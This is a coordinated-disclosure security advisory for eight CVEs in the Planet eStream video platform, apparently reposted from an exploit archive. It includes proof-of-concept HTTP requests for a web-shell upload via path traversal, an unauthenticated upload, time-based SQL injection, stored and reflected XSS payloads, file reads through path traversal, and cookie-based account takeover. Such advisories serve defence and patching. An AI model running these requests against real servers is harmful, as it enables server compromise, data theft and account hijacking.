@@ -1,0 +1,743 @@
+id: 38095
+date: 12/10/2022
+title: Planet eStream Code Execution / SQL Injection / XSS / Broken Control Vulnerabilities
+author: Philipp Espernberger
+cves: CVE-2022-45889, CVE-2022-45890, CVE-2022-45891, CVE-2022-45892, CVE-2022-45893, CVE-2022-45894, CVE-2022-45895, CVE-2022-45896
+
+=======================================================================
+               title: Multiple critical vulnerabilities
+             product: Planet Enterprises Ltd - Planet eStream
+  vulnerable version: <6.72.10.07
+       fixed version: 6.72.10.07
+          CVE number: CVE-2022-45896, CVE-2022-45893, CVE-2022-45891,
+                      CVE-2022-45889, CVE-2022-45892, CVE-2022-45890,
+                      CVE-2022-45894, CVE-2022-45895
+              impact: critical
+            homepage: https://www.planetestream.co.uk
+               found: 2022-09-01
+                  by: Timon Vogel (Office Vienna)
+                      Philipp Espernberger (Office Linz)
+                      Hrvoje Filakovic (Office Osijek)
+                      SEC Consult Vulnerability Lab
+
+                      An integrated part of SEC Consult, an Atos company
+                      Europe | Asia | North America
+
+                      https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"Planet eStream is a powerfully simple and secure video platform,
+making media more accessible and engaging for students and educators
+across secondary, further, and higher education"
+
+Source: https://www.planetestream.co.uk
+
+
+Business recommendation:
+------------------------
+The vendor provides an update for the affected version which should
+be installed immediately.
+
+SEC Consult highly recommends to perform a thorough security review of the
+Planet eStream video streaming platform conducted by security
+professionals to identify and resolve potential further security issues.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Upload of Arbitrary Files Leading to Remote Code Execution (CVE-2022-45896)
+The application allows users to upload files at multiple places. It was
+identified that it is possible to upload arbitrary malicious files without any
+restriction and also without prior authentication! An attacker can upload
+a webshell and takeover the system.
+
+
+2) Account Takeover (CVE-2022-45893)
+A problem identified in the cookie and session management of the web application
+allows users with low privileges to bypass the authentication and authorization
+mechanisms. They can be bypassed by changing the value of the ON cookie. In this way,
+users with low privileges can gain access to application features that are only accessible
+to administrative and privileged users.
+
+
+3) Broken Access Control (CVE-2022-45891)
+Due to flaws in the authorization scheme, an authorization bypass vulnerability
+allows an attacker to get access to restricted functions of the web application.
+This can be leveraged to upload files to the web server without authentication
+and gain access to restricted content that was uploaded by other users.
+
+
+4) SQL Injection (CVE-2022-45889)
+Due to insufficient input validation, the application allows the injection of
+direct SQL commands. By exploiting the vulnerability, an attacker gains access
+to all records stored in the database and can execute arbitrary SQL commands.
+
+
+5) Multiple Stored Cross-Site Scripting (XSS) (CVE-2022-45892)
+User input is not properly sanitized or encoded in various places. This leads to
+several stored cross-site scripting (XSS) vulnerabilities. By exploiting this
+vulnerability, an attacker can persistently embed arbitrary HTML or JavaScript
+code into the affected web page. The code is executed in the context of the
+victim's browser when visiting the manipulated site. Additionally, users are
+potential victims of browser exploits and JavaScript trojans.
+
+
+6) Reflected Cross-Site Scripting (XSS) (CVE-2022-45890)
+One of the application scripts returns unfiltered or unescaped user input. This
+leads to a reflected cross-site scripting (XSS) vulnerability. With reflected
+cross-site scripting, an attacker can inject arbitrary HTML or JavaScript code
+into the victim's web browser. Once the victim clicks a malicious link, the
+attacker's code is executed in the context of the victim's web browser. The
+vulnerability can be used to change the contents of the displayed site or
+redirect to other malicious sites. Additionally, users are potential
+victims of browser exploits and JavaScript trojans.
+
+
+7) Path Traversal (CVE-2022-45894)
+Attackers can gain access to files and directories outside the web root through
+the use of relative file paths. In this case an authenticated
+attacker with any role can inject "..\" sequences into a certain URL parameter
+in order to navigate through the file system and access local files.
+
+
+8) Information Disclosure (CVE-2022-45895)
+Parts of the application were discovered that disclose sensitive data to
+application users. While securely disclosing necessary information to authorized
+users will normally not present a security threat, the identified components
+disclose sensitive data that belongs to other users.
+
+
+Proof of concept:
+-----------------
+1) Upload of Arbitrary Files Leading to Remote Code Execution (CVE-2022-45896)
+Various file upload vulnerabilities were identified in the web application. The
+following sections describe the vulnerabilities in detail.
+
+The file upload is restricted to certain file types in some cases. This
+restriction is only enforced in the frontend and can be bypassed by
+intercepting the request and modifying it. There is no further validation of
+uploaded files in the backend. Therefore, it is sufficient to change the
+filename ending in the intercepted request.
+
+a) File Upload with Path Traversal
+
+An authenticated attacker with the permission to attach documents to already
+existing content (e.g. videos) can upload any file. In some cases, the role
+Member is sufficient. Under "Categories -> choose a video -> related Media" a new
+malicious file can be uploaded.
+
+The following POST request is sent to the server when a normal PNG file is uploaded:
+===============================================================================
+POST /Upload2.ashx?f=seclogo.png&c=0&l=53134&t=1662103112126&p=\Temp&ut=0&tc=0&bs=53134&ct=1662103112126 HTTP/2
+Host: $host
+Cookie: [...]
+
+‰PNG
+[...]
+===============================================================================
+
+Based on the previous POST request to upload files, the request can be
+manipulated to upload any content to any directory by using path traversal
+techniques. The following code shows the modified request. The content is
+changed from a PNG image to an ASP web shell. The filename ending is changed to
+asp and the path is inserted into the p parameter, which is vulnerable to path
+traversal.
+===============================================================================
+POST /Upload2.ashx?f=webshell.asp&c=0&l=1024&t=1661943922096&p=..\$path\&ut=0&tc=0&bs=1024&ct=1661943922097 HTTP/2
+Host: $host
+Cookie: [...]
+
+$ASPWEBSHELL
+===============================================================================
+
+As the following response shows, the file is being processed by the web server:
+===============================================================================
+HTTP/2 200 OK
+Content-Type: text/plain; charset=utf-8
+Date: Fri, 02 Sep 2022 07:16:11 GMT
+Content-Length: 12
+
+progress:100
+===============================================================================
+
+The web shell can now be accessed via the following URL:
+===============================================================================
+https://$host/$path/webshell.asp
+===============================================================================
+
+An attacker now has the possibility to execute any command in context of the web
+server. Therefore, the web server is completely compromised.
+
+As described in chapter 3) Broken Access Control, section a) an unauthenticated
+file upload is possible if the attacker knows the correct request.
+
+
+b) General Upload
+
+An authenticated attacker with the permission to upload documents (role editor,
+publisher or admin) can upload any file. Under "Create -> Upload -> Upload
+Document" a new malicious file can be uploaded.
+
+i) ASP Web Shell
+
+After choosing the malicious file for the file upload the following POST request
+is sent to the web server:
+===============================================================================
+POST /Upload2.ashx?f=cmdasp.asp&c=0&l=1024&t=1661939611305&p=PreConversionMedia\&ut=0&tc=0&bs=1024&ct=1661939611305 HTTP/2
+Host: $host
+Cookie: [...]
+Content-Length: 1024
+
+$ASPWEBSHELL
+===============================================================================
+
+As the following response shows, the file is being processed by the web server:
+===============================================================================
+HTTP/2 200 OK
+Content-Type: text/plain; charset=utf-8
+Date: Wed, 31 Aug 2022 09:53:31 GMT
+Content-Length: 12
+
+progress:100
+===============================================================================
+
+To finish the upload of the malicious file, an attacker simply needs to click
+the "Start Upload" button that becomes visible in the web interface.
+After starting the upload, the following POST request is sent to the web server.
+
+===============================================================================
+POST /Ajax.asmx/ProcessUpload2 HTTP/2
+Host: $host
+Cookie: [...]
+Content-Type: application/json; charset=utf-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 538
+
+{"fn":"webshell.asp","ppid":1,"isprivate":1,"showera":0,"catsinc":"","catsexc":"","retainsource"
+:0,"copyonly":0,"mediaprofile":"0","fieldvalues":"[{\"FieldID\":1,\"Type\":\"txt\",\"FieldValu
+e\":\"webshell\"},{\"FieldID\":2,\"Type\":\"txt\",\"FieldValue\":\"\"},{\"FieldID\":7,\"Type\":\
+"ddl\",\"FieldValue\":\"4\"},{\"FieldID\":10,\"Type\":\"txt\",\"FieldValue\":\"\"},{\"FieldID\
+":14,\"Type\":\"ddl\",\"FieldValue\":\"-1\"},{\"FieldID\":16,\"Type\":\"txt\",\"FieldValue\":\
+"\"}]","mobiledevice":false,"rt":10,"filenameastitle":0,"expiry":""}
+===============================================================================
+
+The response of the web server discloses the new generated filename
+8273~4u~vE7bUON0 as shown below.
+===============================================================================
+HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+Date: Wed, 31 Aug 2022 09:53:31 GMT
+Content-Length: 541
+
+{"d":"{\"Success\":true,\"ClipDataID\":8273,\"Position\":null,\"TotalJobs\":0,\"Message\":\"Element
+bereit\",\"CopyOnlyFail\":false,\"ViewURL\":\"https://$host/View.aspx?id=8273~4u~vE7bUON0\",
+[...]
+}
+===============================================================================
+
+After the filename is known the web shell can now be accessed via following URL:
+===============================================================================
+https://$host/content/8273_4u~vE7bUON0.asp
+===============================================================================
+
+An attacker now has the possibility to execute any command in context of the web
+server. Therefore, the web server is completely compromised.
+
+ii) Malicious HTML File
+
+After choosing the malicious file, the following POST request is sent to the web
+server:
+===============================================================================
+POST /Upload2.ashx?f=secconsult.html&c=0&l=102&t=1661947994372&p=PreConversionMedia\&ut=0&tc=0
+&bs=102&ct=1661947994373 HTTP/2
+Host: $host
+Cookie: [...]
+Content-Length: 1024
+
+<!DOCTYPE html>
+<html>
+<body>
+<h1>SEC Consult Webpage</h1>
+<p>hosted by $host</p>
+</body>
+</html>
+===============================================================================
+
+As the following response shows, the file is being processed by the web server:
+===============================================================================
+HTTP/2 200 OK
+Content-Type: text/plain; charset=utf-8
+Date: Wed, 31 Aug 2022 12:13:13 GMT
+Content-Length: 12
+
+progress:100
+===============================================================================
+
+To finish the upload of the malicious file, an attacker simply needs to click
+the "Start Upload" button which pops up in the web interface.
+After starting the upload, the following POST request is sent to the web server:
+===============================================================================
+POST /Ajax.asmx/ProcessUpload2 HTTP/2
+Host: $host
+Cookie: [...]
+Content-Type: application/json; charset=utf-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 539
+
+{"fn":"secconsult.html","ppid":1,"isprivate":1,"showera":0,"catsinc":"","catsexc":"","retainsou
+rce":0,"copyonly":0,"mediaprofile":"0","fieldvalues":"[{\"FieldID\":1,\"Type\":\"txt\",\"Field
+Value\":\"secconsult\"},{\"FieldID\":2,\"Type\":\"txt\",\"FieldValue\":\"\"},{\"FieldID\":7,\"T
+ype\":\"ddl\",\"FieldValue\":\"4\"},{\"FieldID\":10,\"Type\":\"txt\",\"FieldValue\":\"\"},{\"F
+ieldID\":14,\"Type\":\"ddl\",\"FieldValue\":\"-1\"},{\"FieldID\":16,\"Type\":\"txt\",\"FieldValue
+\":\"\"}]","mobiledevice":false,"rt":10,"filenameastitle":0,"expiry":""}
+===============================================================================
+
+The response of the web server discloses the new generated filename
+8278~4z~b2w2tWQF as shown below.
+===============================================================================
+HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+Date: Wed, 31 Aug 2022 12:13:14 GMT
+Content-Length: 545
+
+{"d":"{\"Success\":true,\"ClipDataID\":8278,\"Position\":null,\"TotalJobs\":0,\"Message\":\"Element
+bereit\",\"CopyOnlyFail\":false,\"ViewURL\":\"https://$host/View.aspx?id=8278~4z~b2w2tWQF\",
+[...]
+}
+===============================================================================
+
+The HTML webpage can now be accessed via following URL:
+===============================================================================
+https://$host/content/8278_4z~b2w2tWQF.html
+===============================================================================
+
+An attacker now has the possibility to infect the user's browser with JavaScript
+to execute any command in the context of the web server or can host webpages for
+phishing attacks on the server of the Planet eStream instance.
+
+
+2) Account Takeover (CVE-2022-45893)
+An authenticated attacker with the role Member or Bypass can elevate their
+privileges by changing the ON cookie value. An attacker can easily brute force
+the value of the cookie due to the low entropy of the cookie or search for
+leaked cookie values in the web application as described in chapter
+8) Information Disclosure, section a).
+
+Based on the format of the cookie the following pattern was used to generate
+possibly valid cookies.
+===============================================================================
+[0-1][AZ]~[azAZ][azAZ]
+===============================================================================
+
+To verify the vulnerability an authenticated session is required. Sessions that
+are created by opening a sharing link to bypass authentication are sufficient.
+Therefore, an attacker doesn’t necessarily need a valid user account with valid
+credentials to gain privileged access.
+
+To abuse the vulnerability, an attacker can use the browser developer tool to
+permanently change the value of the ON cookie. By changing the value of the
+ON cookie for example to $VALID_COOKIE, the current privileges are set to the
+privileges of the original user who has the ON cookie $VALID_COOKIE.
+
+An attacker can gain administrative privileges and access other accounts by
+obtaining valid ON cookies for the respective accounts through brute force or
+information disclosure.
+
+One essential aspect is that the ON cookie is persistent and never changes, not
+even between sessions. Therefore, an attacker has permanent access to elevated
+privileges or other user accounts once a valid ON cookie is identified.
+
+
+3) Broken Access Control (CVE-2022-45891)
+a) Unauthenticated Upload
+
+As described in chapter 1) Upload of Arbitrary Files Leading to Remote Code
+Execution an attacker has the possibility to upload arbitrary files. Once
+attackers know the correct POST request to upload files, they can repeat the
+same request without prior authentication and successfully upload arbitrary
+files. To verify the vulnerability the following request can be sent
+unauthenticated (without cookies) to the web server.
+===============================================================================
+POST /Upload2.ashx?f=unauthenticated.txt&c=0&l=30&t=1662047867388&p=..\..\&ut=0&tc=0&bs=30&ct=1662047867388 HTTP/2
+Host: $host
+
+SEC Consult - upload
+===============================================================================
+
+As the following response shows, the file is being processed by the web server:
+===============================================================================
+HTTP/2 200 OK
+Date: Mo, 19 Sep 2022 08:10:44 GMT
+Content-Length: 12
+
+progress:100
+===============================================================================
+
+The unauthenticated file upload was verified by identifying the file
+unauthenticated.txt on the server.
+
+In conclusion, this vulnerability exacerbates the risk of the file upload
+vulnerability. It increases the likelihood of exploitation since it enables an
+attacker to upload files without authentication.
+
+
+b) Access Grant List
+
+An attacker needs to be authenticated with the role Member or Bypass to exploit
+the vulnerability. The vulnerability allows an attacker to modify the access
+list and grant himself access to private videos. Additionally, an attacker can
+make any video unavailable to other users by changing the access grant list.
+The vulnerability also applies to other content on the platform.
+
+To verify the vulnerability a video with restricted access is created. It can
+be accessed under the following URL:
+===============================================================================
+https://$host/View.aspx?id=1337~4u~vE7bUKN5
+===============================================================================
+
+By executing the POST request shown below, an attacker can add himself to the
+access grant list and gain access to the private video.
+===============================================================================
+POST /Ajax.asmx/SaveGrantAccessList HTTP/2
+Host: $host
+Cookie: [...]
+Content-Type: application/json; charset=utf-8
+Content-Length: 65
+
+{"cdid":"1337","data":"[{\"Address\":\"test@attacker.com\",\"CanEdit\":true}]"}
+===============================================================================
+
+The server responds with a status code 200 successful.
+===============================================================================
+HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+Date: Thu, 01 Sep 2022 10:20:58 GMT
+[...]
+Content-Length: 75
+
+{"d":"{\"Success\":true,\"Message\":\"Access list updated successfully\"}"}
+===============================================================================
+
+The user with the e-mail address test@attacker.com has been added to the
+access grant list and can view the private video with the ID 1337.
+
+The vulnerability can also be leveraged to block access to the video for other
+users (Denial-of-Service) by adding any malicious content "malicious_payload"
+instead of the valid e-mail address.
+
+
+4) SQL Injection (CVE-2022-45889)
+To demonstrate this vulnerability access to the search functionality in the
+statistic interface is required. An authenticated attacker with the role
+Publisher or Admin can use the following GET request to reproduce the
+vulnerability.
+===============================================================================
+GET /Stats/StatisticsResults.aspx?q=viewingday&p1=20220831&p2=&db1=stats&db2=clipdata&flt=+s_RecordTypeID+IN+(1)+;WAITFOR+DELAY+'0:0:5'-- HTTP/2
+Host: $host
+Cookie: [...]
+===============================================================================
+
+The resulting response took more than five seconds. Thus it can be
+concluded that an SQL injection is present.
+Furthermore, exploitation by the tool sqlmap was possible and lead to a
+successful extraction of the complete backend database.
+
+
+5) Multiple Stored Cross-Site Scripting (XSS) (CVE-2022-45892)
+a) Disclaimer
+
+An attacker needs to be authenticated with the role Admin to exploit the stored
+XSS vulnerability. The vulnerability will be executed afterwards for each user
+who logs into the web application. To verify the issue, an attacker needs to
+modify the disclaimer of the cookie description. In the admin section the
+system options can be modified to change the disclaimer text.
+
+===============================================================================
+https://$host/Admin/SystemOptions.aspx?disclaimer=1
+===============================================================================
+
+By clicking the Source button, an admin user can inject a malicious payload.
+===============================================================================
+<img src=x onerror=javascript:alert(location.origin)//">
+===============================================================================
+
+After saving the modified disclaimer text, the payload is executed by visiting
+different parts of the application. If a user visits the MyHome tab the payload
+is triggered in the browser. The payload is also executed if a user hasn't
+accepted the disclaimer text yet, which is true for any new user.
+
+b) Search Function
+
+An attacker needs to be authenticated with the role Member to exploit the stored
+XSS vulnerability. The vulnerability will be executed afterwards for each user,
+who inspects the statistic view provided by the web application. To verify the
+issue, an attacker can search for following malicious payload that is then
+automatically stored in the database.
+===============================================================================
+<img onerror="javascript:alert(location.origin)" src="abcdef";//<
+===============================================================================
+
+Afterwards, the malicious payload is triggered if a user lists the statistical
+data for the Search Breakdown in the last seven days.
+
+c) Comments
+
+An attacker needs to be authenticated with the role Member to exploit the stored
+XSS vulnerability. The vulnerability will be executed afterwards for each user,
+who visits the content element that contains the malicious comment. To verify
+the issue, the following malicious payload can be injected into the public or
+private comment field.
+===============================================================================
+<img onerror="javascript:alert(location.origin)" src="abcdef";//
+===============================================================================
+
+d) Batch editing tool
+
+An attacker needs to be authenticated with the role Admin to exploit the stored
+XSS vulnerability. The vulnerability will be executed afterwards for each user,
+who visits the modified content. To verify the issue, an attacker needs to
+modify the owner of the content. In the search section the admin has the
+possibility to use the Batch-Editing tool.
+===============================================================================
+https://$host/Default.aspx?search=consult&o=8&page=1&fp=0&report=1&rlt=0
+===============================================================================
+
+By selecting the action Change owner, an admin user can inject a malicious
+payload in the user input box.
+===============================================================================
+<img src=x onerror=javascript:alert(location.origin)//">
+===============================================================================
+
+After injecting the malicious payload, the XSS payload is executed when the
+content element is visited or when it appears in search results.
+===============================================================================
+https://$host/Default.aspx?search=8298
+https://$host/View.aspx?id=8298~4B~dpa3P9mb&psid=136
+===============================================================================
+
+e) Content Creation
+
+Permission to create content within the web application is required. Thus, an
+attacker needs to be authenticated with the role Editor, Publisher, or Admin to
+exploit the vulnerability. The issue can be verified by placing malicious HTML
+code in the title input field of the content creation dialog window. For this
+the following malicious payload can be used:
+===============================================================================
+<img src='x' onerror='javascript:alert(location.origin)' style='
+===============================================================================
+
+When the content creation progress is finished, the JavaScript code is
+permanently stored in the web application. It will trigger in every browser that
+visits webpages that lists the modified item (for example, under the category
+view, search results and content list).
+
+The following content upload possibilities are affected by this vulnerability:
+- Upload Video or Audio files
+- Upload Documents
+- Add External Links
+- Playlist
+- Photoset
+
+f) Related Media
+
+HTML code can be injected in the title of the related media upload. Editing
+access to the content is required. This is normally the case for the users with
+the role Editors, Publishers or Admins. The malicious code can be injected in
+the title of the related content. To validate the vulnerability a new file must
+be uploaded in the related media tab. The next step is to change the filename
+to inject the malicious HTML and JavaScript code.
+===============================================================================
+<img src='x' onerror='javascript:alert(location.origin)'photo.png
+===============================================================================
+
+When the title including the malicious payload is saved and the page reloaded,
+the payload within the title will be executed. The new title is stored in the
+web application along with the malicious HTML code. It will execute in any
+browser that visits the content item. Opening the related media tab is not
+necessary.
+
+g) Create new user
+
+An attacker needs to be authenticated with the role Admin to exploit the stored
+XSS vulnerability. The vulnerability will be executed afterwards for admin users
+in the user section and for the created users once they are logged in. To verify
+the issue, an attacker needs to create a new user. Under Tools -> Admin ->
+Users, Permissions, Authentication -> Users the admin has the possibility to
+create new users.
+===============================================================================
+https://$host/Admin/EditUser.aspx
+===============================================================================
+
+The following malicious payload was added to the Full Name input field:
+===============================================================================
+<script>alert(location.origin)</script>
+===============================================================================
+
+After creating the new user, the malicious payload gets executed once the new
+user logs in or the admin visits the user section (Tools -> Admin -> Users,
+Permissions, Authentication -> Users).
+
+h) Change Username
+
+A cross-site scripting vulnerability can be found under https://$host/MyHome.aspx
+where a user can edit the name shown on his home page. All authenticated users
+can access home pages of other users and are thus affected by this vulnerability.
+Furthermore, the vulnerability can be exploited by an authenticated user of any
+role. The following request was used to change the username.
+===============================================================================
+POST /Ajax.asmx/SaveLayoutData HTTP/2
+Host: $host
+Cookie: [...]
+Content-Length: 360
+Content-Type: application/json; charset=UTF-8
+[...]
+
+{"id":$ID,"layoutdata":"[{\"title\":{\"enabled\":true,\"text\":\"test<img
+src='x' onerror='alert(location.origin)'\",[...]
+===============================================================================
+
+The request is accepted by the web application as shown below:
+===============================================================================
+HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+Content-Length: 92
+
+{"d":"{\"Success\":true,\"Message\":\"Layout erfolgreich gespeichert\",\"HTML\":
+[\"455\"]}"}
+===============================================================================
+
+Sending the request directly bypasses the check for special characters like < or >
+that exist in the frontend. The malicious username string is embedded on the
+website and will execute when it is opened in the browser in any subsequent
+request.
+
+
+6) Reflected Cross-Site Scripting (XSS) (CVE-2022-45890)
+An attacker needs authenticated access to the web application with the role
+Member or higher to identify and exploit the vulnerability. To identify this
+vulnerability, it is sufficient to open the following URL (no special manipulation
+of the request is needed) and analyze the HTTP response from the web server:
+===============================================================================
+https://$host/Default.aspx?search=test&page=1&fp=0&r=(0_7_0_%3Ch1%3ESEC%20Consult%3C/h1%3E__)
+===============================================================================
+
+The string SEC Consult is embedded in the webpage of this URL.
+The next step is to identify a working payload which triggers the cross-site
+scripting vulnerability. To verify the vulnerability, it is sufficient to open
+the following URL:
+===============================================================================
+https://$host/Default.aspx?search=*&o=8&page=1&fp=0&r=(0_7_0_%3Cscript%3Ealert(location.origin)%3C/script%3E__)
+===============================================================================
+
+Another working payload for the fo parameter was identified:
+===============================================================================
+https://$host/Default.aspx?search=*&fo=%3Cimg%20onerror=%22javascript:alert(location.origin)%22%20src=%22abcdef%22;//
+===============================================================================
+
+It must be mentioned that all metadata filter fields are affected by this
+vulnerability.
+
+
+7) Path Traversal (CVE-2022-45894)
+An attacker authenticated with the role Member can navigate to the vulnerable
+URL path provided below and inject "..\" sequences to move up directories on the
+web server and access local files.
+
+Simply navigating to the link with the injected path traversal payload an
+attacker can download any file on the web server and read its contents.
+To verify the vulnerability the file NetSetup.LOG which contains details of the
+entire process of joining the domain was downloaded. The following URL was used:
+===============================================================================
+https://$host/GetFile.aspx?file=/image/..\..\..\..\..\..\..\..\..\..\Windows\debug\NetSetup.LOG
+===============================================================================
+
+
+8) Information Disclosure (CVE-2022-45895)
+a) ON cookie
+
+The information disclosure of the ON cookie was identified on three different
+pages of the web application. Since the cookie can be used to access other user
+accounts with elevated privileges, it comprises highly confidential information.
+It is embedded in the web application's response in different ways and there are
+always multiple cookies for different users in the response. Requests to obtain
+the sensitive information can be performed with authentication as arbitrary
+user.
+
+The ON cookie was embedded in three pages that are accessible under the
+following paths:
+  -  /Default.aspx?catid=69 (HTML)
+  -  /Default.aspx?search=*&o=8&page=1&report=1&rlt=0&export=1&t=1661787629149 (CSV)
+  -  /GetJson.aspx?t=1&display=3&data=69&source=2&o=8&title= (JSON)
+
+As an example the ON cookie leakage is shown in the HTML response. The cookie
+value can be identified in the href and src attributes of the a element
+($VALID_COOKIE).
+===============================================================================
+[...]
+<div><a title="Open Media" tabindex="-1" href="/View.aspx?id=228~$VALID_COOKIE">
+<img title="228" data-alt-src="" src="/Media/Images/ClipData/228_$VALID_COOKIE.jpg"/></a>
+[...]
+===============================================================================
+
+b) WhoAmI
+
+The sensitive data comprises internal information that lets an attacker gain
+deeper knowledge about the application. To verify the vulnerability, it is
+sufficient to request the following URL as authenticated user (any role):
+===============================================================================
+https://$host/WhoAmI.aspx
+===============================================================================
+
+An excerpt of the disclosed information is shown:
+===============================================================================
+<div [...]>APPL_MD_PATH</div>[...]/ROOT
+<div [...]>APPL_PHYSICAL_PATH</div>c:\inetpub\[...]\
+<div [...]>LOCAL_ADDR</div>172.0.0.5
+<div [...]>PATH_TRANSLATED</div>c:\inetpub\[...]\WhoAmI.aspx
+<div [...]>REMOTE_ADDR</div>172.0.255.6
+<div [...]>SERVER_PORT</div>443
+<div [...]>SERVER_PROTOCOL</div>HTTP/1.1
+<div [...]>SERVER_SOFTWARE</div>Microsoft-IIS/9.0
+<div [...]>Enable New UI</div>-1
+<div [...]>Enable New UI (Schema)</div>False
+<div [...]>Prop.OnMobileDevice</div>0
+<div [...]>UID</div>228
+<div [...]>Prop.MachineName</div>[...]
+<div [...]>Demo Server</div>False
+===============================================================================
+
+
+Vulnerable / tested versions:
+-----------------------------
+The vulnerabilities have been found in version 6.72.07.04.
+
+
+Vendor contact timeline:
+------------------------
+2022-09-02: Submitting initial critical findings to vendor.
+2022-10-03: Contacting vendor through direct email.
+2022-10-03: Providing vendor with proof-of-concept.
+2022-10-24: The new software version (6.72.09.29) with the security patches of the
+             reported vulnerabilities was tested by SEC Consult.
+2022-10-24: SEC Consult could determine that the critical findings were fixed
+             appropriately and are no longer exploitable in the version (6.72.09.29).
+2022-11-04: Following up with vendor.
+2022-11-10: Follow up again.
+2022-11-18: Vendor provided updated version number (6.72.10.07) which includes all
+             of the fixes.
+2022-11-18: Vendor confirmed that all customers have been contacted and recommended
+             to update.
+2022-11-25: Received CVE numbers.
+2022-11-30: Coordinated release of security advisory.
+
+
+Solution:
+---------
+The vendor rolled out a new software version. Affected users should verify that
+they are using the latest version available v6.72.10.07 which fixes all
+identified security issues according to the vendor.
+
+#  0day.today [2023-03-27]  #
